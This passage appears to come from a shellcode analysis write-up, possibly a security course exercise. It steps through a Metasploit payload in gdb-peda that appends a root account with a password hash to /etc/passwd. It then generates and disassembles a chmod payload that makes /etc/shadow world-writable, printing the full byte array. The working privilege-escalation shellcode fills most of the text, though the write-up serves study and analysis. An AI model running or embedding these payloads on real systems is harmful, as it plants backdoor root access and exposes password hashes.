   0x804a04b <code+11>:	pop    eax
   0x804a04c <code+12>:	xor    ecx,ecx
   0x804a04e <code+14>:	push   ecx
=> 0x804a04f <code+15>:	push   0x64777373 ; build the /etc/passwd string in the stack
   0x804a054 <code+20>:	push   0x61702f2f
   0x804a059 <code+25>:	push   0x6374652f
   0x804a05e <code+30>:	mov    ebx,esp
   0x804a060 <code+32>:	inc    ecx
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x28 ('(')
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a04f in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c4 ("sswd")
EIP: 0x804a054 ("h//pah/etc\211?A?\004?\200\223?(")
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a04c <code+12>:	xor    ecx,ecx
   0x804a04e <code+14>:	push   ecx
   0x804a04f <code+15>:	push   0x64777373
=> 0x804a054 <code+20>:	push   0x61702f2f ; build the /etc/passwd string in the stack
   0x804a059 <code+25>:	push   0x6374652f
   0x804a05e <code+30>:	mov    ebx,esp
   0x804a060 <code+32>:	inc    ecx
   0x804a061 <code+33>:	mov    ch,0x4
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c4 ("sswd")
0004| 0xbffff6c8 --> 0x0 
0008| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0012| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0016| 0xbffff6d4 --> 0x28 ('(')
0020| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0024| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0028| 0xbffff6e0 --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a054 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c0 ("//passwd")
EIP: 0x804a059 ("h/etc\211?A?\004?\200\223?(")
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a04e <code+14>:	push   ecx
   0x804a04f <code+15>:	push   0x64777373
   0x804a054 <code+20>:	push   0x61702f2f
=> 0x804a059 <code+25>:	push   0x6374652f ; build the /etc/passwd string in the stack
   0x804a05e <code+30>:	mov    ebx,esp
   0x804a060 <code+32>:	inc    ecx
   0x804a061 <code+33>:	mov    ch,0x4
   0x804a063 <code+35>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c0 ("//passwd")
0004| 0xbffff6c4 ("sswd")
0008| 0xbffff6c8 --> 0x0 
0012| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0016| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0020| 0xbffff6d4 --> 0x28 ('(')
0024| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0028| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a059 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a05e --> 0xb541e389
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a04f <code+15>:	push   0x64777373
   0x804a054 <code+20>:	push   0x61702f2f
   0x804a059 <code+25>:	push   0x6374652f
=> 0x804a05e <code+30>:	mov    ebx,esp ; ptr to /etc/passwd string
   0x804a060 <code+32>:	inc    ecx
   0x804a061 <code+33>:	mov    ch,0x4
   0x804a063 <code+35>:	int    0x80
   0x804a065 <code+37>:	xchg   ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a05e in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0xbffff6bc ("/etc//passwd")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a060 --> 0xcd04b541
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a054 <code+20>:	push   0x61702f2f
   0x804a059 <code+25>:	push   0x6374652f
   0x804a05e <code+30>:	mov    ebx,esp
=> 0x804a060 <code+32>:	inc    ecx ; increments ECX
   0x804a061 <code+33>:	mov    ch,0x4
   0x804a063 <code+35>:	int    0x80
   0x804a065 <code+37>:	xchg   ebx,eax
   0x804a066 <code+38>:	call   0x804a093 <code+83>
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a060 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0xbffff6bc ("/etc//passwd")
ECX: 0x1 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a061 --> 0x80cd04b5
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a059 <code+25>:	push   0x6374652f
   0x804a05e <code+30>:	mov    ebx,esp
   0x804a060 <code+32>:	inc    ecx
=> 0x804a061 <code+33>:	mov    ch,0x4 ; Append mode
   0x804a063 <code+35>:	int    0x80
   0x804a065 <code+37>:	xchg   ebx,eax
   0x804a066 <code+38>:	call   0x804a093 <code+83>
   0x804a06b <code+43>:	ins    DWORD PTR es:[edi],dx
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a061 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0xbffff6bc ("/etc//passwd")
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a063 --> 0xe89380cd
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a05e <code+30>:	mov    ebx,esp
   0x804a060 <code+32>:	inc    ecx
   0x804a061 <code+33>:	mov    ch,0x4
=> 0x804a063 <code+35>:	int    0x80 ; open /etc/passwd in append mode
   0x804a065 <code+37>:	xchg   ebx,eax
   0x804a066 <code+38>:	call   0x804a093 <code+83>
   0x804a06b <code+43>:	ins    DWORD PTR es:[edi],dx
   0x804a06c <code+44>:	gs
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a063 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xfffffff3 
EBX: 0xbffff6bc ("/etc//passwd")
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a065 --> 0x28e893
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a060 <code+32>:	inc    ecx
   0x804a061 <code+33>:	mov    ch,0x4
   0x804a063 <code+35>:	int    0x80
=> 0x804a065 <code+37>:	xchg   ebx,eax ; save file descriptor to /etc/passwd
   0x804a066 <code+38>:	call   0x804a093 <code+83>
   0x804a06b <code+43>:	ins    DWORD PTR es:[edi],dx
   0x804a06c <code+44>:	gs
   0x804a06d <code+45>:	je     0x804a0d0
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a065 in code ()
gdb-peda$ 

[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc ("/etc//passwd")
EBX: 0xfffffff3 
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a066 --> 0x28e8
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a061 <code+33>:	mov    ch,0x4
   0x804a063 <code+35>:	int    0x80
   0x804a065 <code+37>:	xchg   ebx,eax
=> 0x804a066 <code+38>:	call   0x804a093 <code+83> ; build string metasploit:metasploit:0:0::/:/bin/sh
   0x804a06b <code+43>:	ins    DWORD PTR es:[edi],dx
   0x804a06c <code+44>:	gs
   0x804a06d <code+45>:	je     0x804a0d0
   0x804a06f <code+47>:	jae    0x804a0e1
Guessed arguments:
arg[0]: 0x6374652f ('/etc')
arg[1]: 0x61702f2f ('//pa')
arg[2]: 0x64777373 ('sswd')
arg[3]: 0x0 
arg[4]: 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a066 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc ("/etc//passwd")
EBX: 0xfffffff3 
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6b8 --> 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EIP: 0x804a093 --> 0xfc518b59
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x804a093 <code+83>:	pop    ecx ; ptr to string metasploit:metasploit:0:0::/:/bin/sh
   0x804a094 <code+84>:	mov    edx,DWORD PTR [ecx-0x4] ; ptr to /etc//passwd
   0x804a097 <code+87>:	push   0x4
   0x804a099 <code+89>:	pop    eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b8 --> 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
0004| 0xbffff6bc ("/etc//passwd")
0008| 0xbffff6c0 ("//passwd")
0012| 0xbffff6c4 ("sswd")
0016| 0xbffff6c8 --> 0x0 
0020| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0024| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0028| 0xbffff6d4 --> 0x28 ('(')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a093 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc ("/etc//passwd")
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a094 --> 0x6afc518b
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x804a094 <code+84>:	mov    edx,DWORD PTR [ecx-0x4] ; ptr to /etc//passwd
   0x804a097 <code+87>:	push   0x4
   0x804a099 <code+89>:	pop    eax
   0x804a09a <code+90>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a094 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc ("/etc//passwd")
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x28 ('(')
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a097 --> 0xcd58046a
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a092 <code+82>:	or     bl,BYTE PTR [ecx-0x75]
   0x804a095 <code+85>:	push   ecx
   0x804a096 <code+86>:	cld    
=> 0x804a097 <code+87>:	push   0x4 ; push 0x4 on the stack (sys_write)
   0x804a099 <code+89>:	pop    eax
   0x804a09a <code+90>:	int    0x80
   0x804a09c <code+92>:	push   0x1
   0x804a09e <code+94>:	pop    eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a097 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc ("/etc//passwd")
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x28 ('(')
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6b8 --> 0x4 
EIP: 0x804a099 --> 0x6a80cd58
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a095 <code+85>:	push   ecx
   0x804a096 <code+86>:	cld    
   0x804a097 <code+87>:	push   0x4
=> 0x804a099 <code+89>:	pop    eax ; store 0x4 in eax (sys_write)
   0x804a09a <code+90>:	int    0x80
   0x804a09c <code+92>:	push   0x1
   0x804a09e <code+94>:	pop    eax
   0x804a09f <code+95>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b8 --> 0x4 
0004| 0xbffff6bc ("/etc//passwd")
0008| 0xbffff6c0 ("//passwd")
0012| 0xbffff6c4 ("sswd")
0016| 0xbffff6c8 --> 0x0 
0020| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0024| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0028| 0xbffff6d4 --> 0x28 ('(')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a099 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x4 
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x28 ('(')
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a09a --> 0x16a80cd
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a096 <code+86>:	cld    
   0x804a097 <code+87>:	push   0x4
   0x804a099 <code+89>:	pop    eax
=> 0x804a09a <code+90>:	int    0x80 ; call write to /etc/passwd
   0x804a09c <code+92>:	push   0x1
   0x804a09e <code+94>:	pop    eax
   0x804a09f <code+95>:	int    0x80
   0x804a0a1 <code+97>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a09a in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xfffffff7 
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x28 ('(')
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a09c --> 0xcd58016a
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a097 <code+87>:	push   0x4
   0x804a099 <code+89>:	pop    eax
   0x804a09a <code+90>:	int    0x80
=> 0x804a09c <code+92>:	push   0x1 ; push 0x1 (sys_exit)
   0x804a09e <code+94>:	pop    eax
   0x804a09f <code+95>:	int    0x80
   0x804a0a1 <code+97>:	add    BYTE PTR [eax],al
   0x804a0a3:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a09c in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xfffffff7 
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x28 ('(')
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6b8 --> 0x1 
EIP: 0x804a09e --> 0x80cd58
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a099 <code+89>:	pop    eax
   0x804a09a <code+90>:	int    0x80
   0x804a09c <code+92>:	push   0x1
=> 0x804a09e <code+94>:	pop    eax ; store 0x1 (sys_exit) in EAX
   0x804a09f <code+95>:	int    0x80
   0x804a0a1 <code+97>:	add    BYTE PTR [eax],al
   0x804a0a3:	add    BYTE PTR [eax],al
   0x804a0a5:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b8 --> 0x1 
0004| 0xbffff6bc ("/etc//passwd")
0008| 0xbffff6c0 ("//passwd")
0012| 0xbffff6c4 ("sswd")
0016| 0xbffff6c8 --> 0x0 
0020| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0024| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0028| 0xbffff6d4 --> 0x28 ('(')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a09e in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xfffffff3 
ECX: 0x804a06b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q?j\004X?\200j\001X?\200")
EDX: 0x28 ('(')
ESI: 0x0 
EDI: 0x804a069 --> 0x656d0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6bc ("/etc//passwd")
EIP: 0x804a09f --> 0x80cd
EFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a09a <code+90>:	int    0x80
   0x804a09c <code+92>:	push   0x1
   0x804a09e <code+94>:	pop    eax
=> 0x804a09f <code+95>:	int    0x80 ; call exit(0)
   0x804a0a1 <code+97>:	add    BYTE PTR [eax],al
   0x804a0a3:	add    BYTE PTR [eax],al
   0x804a0a5:	add    BYTE PTR [eax],al
   0x804a0a7:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc ("/etc//passwd")
0004| 0xbffff6c0 ("//passwd")
0008| 0xbffff6c4 ("sswd")
0012| 0xbffff6c8 --> 0x0 
0016| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6d4 --> 0x28 ('(')
0028| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a09f in code ()
gdb-peda$ s
[Inferior 1 (process 1308) exited with code 0363]
Warning: not running or target is remote
gdb-peda$ 
```

From the debug it's possible to evince that the shellcode behave as expected, adding a new root user to the passwd file.

## Shellcode 2 Analysis

Shellcode Options:

```
root@0802ed4415ba:/# msfvenom -p linux/x86/chmod --payload-options
Options for payload/linux/x86/chmod:


       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode


Advanced options for payload/linux/x86/chmod:

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
Evasion options for payload/linux/x86/chmod:

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
root@0802ed4415ba:/# 
```

Shellcode generation:

```
root@0802ed4415ba:/# msfvenom -p linux/x86/chmod --arch x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
root@0802ed4415ba:/#
```

Shellcode opcodes:

```
$ echo -ne "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"| ndisasm -u -
00000000  99                cdq
00000001  6A0F              push byte +0xf ; push 0xf (sys_chmod) on the stack
00000003  58                pop eax ; store 0xf (sys_chmod) in EAX
00000004  52                push edx
00000005  E80C000000        call dword 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popad
00000012  646F              fs outsd
00000014  7700              ja 0x16 ; finish building ptr to /etc/shadow string on stack
00000016  5B                pop ebx ; ptr string /etc/shadow
00000017  68B6010000        push dword 0x1b6 ; push MODE 0666 on stack
0000001C  59                pop ecx ; store 0x1b6 (MODE 0666) in ECX
0000001D  CD80              int 0x80 ; call sys_chmod
0000001F  6A01              push byte +0x1 ; push 0x1 (sys_exit) on stack
00000021  58                pop eax ; store 0x1 (sys_exit) in EAX
00000022  CD80              int 0x80 ; calls sys_exit(0)
```

Libemu:

```
root@kali:~# msfvenom -p linux/x86/chmod --arch x86 --platform linux R | /opt/libemu/bin/sctest -vvv -Ss 1000000
verbose = 3
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes

[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417000
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417000
